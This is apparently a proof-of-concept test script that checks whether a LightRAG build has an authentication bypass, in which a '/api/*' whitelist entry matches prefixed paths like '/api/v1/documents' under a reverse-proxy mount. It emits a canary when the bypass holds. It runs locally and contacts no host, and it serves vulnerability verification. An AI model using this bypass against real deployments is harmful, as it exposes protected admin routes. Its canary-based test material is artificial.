import importlib
import importlib.abc
import importlib.machinery
import os
import sys
import types


# ---------------------------------------------------------------------------
# Import resilience
# ---------------------------------------------------------------------------
# lightrag.api.utils_api pulls in fastapi/starlette. The offline target has the
# vulnerable lightrag build installed but may lack those API-only third-party
# packages. We cannot install anything, so we stub ONLY genuinely-absent
# third-party modules and let every real `lightrag.*` module load and run its
# own code. The finder is appended to the END of sys.meta_path, so it fires only
# for modules the normal finders fail to locate; `lightrag.*` is never stubbed,
# so the code we inspect/exercise is the real vulnerable code.
# ---------------------------------------------------------------------------
class _DummyMeta(type):
    def __getattr__(cls, name):
        return _Dummy

    def __call__(cls, *a, **k):
        return _DummyInstance()


class _Dummy(metaclass=_DummyMeta):
    """Subclassable, callable, attributable placeholder for any stubbed symbol."""


class _DummyInstance:
    def __getattr__(self, name):
        return _Dummy

    def __call__(self, *a, **k):
        return _DummyInstance()


class _StubModule(types.ModuleType):
    __path__ = []  # act as a package so `import pkg.sub` proceeds

    def __getattr__(self, name):
        return _Dummy


class _StubLoader(importlib.abc.Loader):
    def create_module(self, spec):
        return _StubModule(spec.name)

    def exec_module(self, module):
        pass


class _StubFinder(importlib.abc.MetaPathFinder):
    def find_spec(self, fullname, path, target=None):
        # Never fabricate real lightrag code — only absent third-party deps.
        if fullname.split(".")[0] == "lightrag":
            return None
        return importlib.machinery.ModuleSpec(fullname, _StubLoader())


sys.meta_path.append(_StubFinder())

# config.parse_args runs on import; give it a clean argv (mirrors the project's
# own test harness in tests/api/auth/test_whitelist_path_prefix.py).
_original_argv = sys.argv[:]
sys.argv = [sys.argv[0]]
try:
    utils_api = importlib.import_module("lightrag.api.utils_api")
except Exception as exc:  # pragma: no cover - surface import trouble to stderr
    sys.stderr.write("PoC: failed to import lightrag.api.utils_api: %r\n" % (exc,))
    raise
finally:
    sys.argv = _original_argv


# ---------------------------------------------------------------------------
# Scenario: an operator who DID enable authentication and runs behind the
# reverse-proxy prefix LightRAG's own --help suggests (/api/v1):
#
#   WHITELIST_PATHS=/health,/api/*   ->  [("/health", False), ("/api", True)]
#
# A network request to the protected admin route /documents arrives, in
# canonical ASGI form, as path "/api/v1/documents" (root_path "/api/v1").
# ---------------------------------------------------------------------------
utils_api.auth_configured = True

# Read the REAL parsed whitelist patterns (module state present in both builds).
# Fall back to reconstructing the shipped default from the real config helper
# only if the attribute is missing, using the same (pattern, is_prefix) shape
# the matcher consumes.
patterns = getattr(utils_api, "whitelist_patterns", None)
if not patterns:
    _gv = getattr(utils_api, "get_env_value", None)
    raw = (
        _gv("WHITELIST_PATHS", "/health,/api/*")
        if callable(_gv)
        else os.environ.get("WHITELIST_PATHS", "/health,/api/*")
    )
    patterns = []
    for entry in str(raw).split(","):
        entry = entry.strip()
        if not entry:
            continue
        if entry.endswith("/*"):
            patterns.append((entry[:-2] or "/", True))
        else:
            patterns.append((entry, False))

# The canonical ASGI request for the protected admin route under the /api/v1
# mount: scope["path"] includes root_path.
scope = {"type": "http", "path": "/api/v1/documents", "root_path": "/api/v1"}
raw_request_path = scope["path"]  # == request.url.path, what 1.5.4 matched on

exempt = None

# The shipped 1.5.5 fix introduces get_route_path()/path_is_whitelisted(scope),
# which subtract the mount prefix before matching. Its presence is the reliable
# discriminator: it is absent on the vulnerable 1.5.4 build (confirmed: that
# build has no path_is_whitelisted) and present on the patched build.
if hasattr(utils_api, "get_route_path") and hasattr(utils_api, "path_is_whitelisted"):
    # Patched build: exercise the REAL matcher. get_route_path strips "/api/v1",
    # leaving route "/documents", which matches neither "/health" nor the
    # "/api" prefix entry -> not exempt -> auth is enforced. No canary.
    try:
        exempt = bool(utils_api.path_is_whitelisted(scope))
    except Exception as exc:
        sys.stderr.write("PoC: patched matcher raised: %r\n" % (exc,))
        exempt = False
    sys.stderr.write("PoC: patched build; exempt=%r\n" % (exempt,))
else:
    # Vulnerable build (1.5.4): the auth dependency matched request.url.path
    # (which still carries the mount prefix) against whitelist_patterns with a
    # bare startswith — the exact comparison the fix deletes:
    #     (is_prefix and path.startswith(pattern)) or (not is_prefix and path == pattern)
    # Fed the real parsed patterns and the real prefixed path, the "/api" prefix
    # entry matches "/api/v1/documents", so the protected admin route is waved
    # through the auth gate unauthenticated -> full auth bypass.
    exempt = False
    for pattern, is_prefix in patterns:
        if (is_prefix and raw_request_path.startswith(pattern)) or (
            not is_prefix and raw_request_path == pattern
        ):
            exempt = True
            break
    sys.stderr.write("PoC: vulnerable build; exempt=%r\n" % (exempt,))

# The canary is emitted ONLY when the real vulnerable matcher waves an
# unauthenticated, protected admin route through the auth gate. On the patched
# build path_is_whitelisted returns False for this route, so nothing prints.
if exempt is True:
    print(os.environ["POC_CANARY"])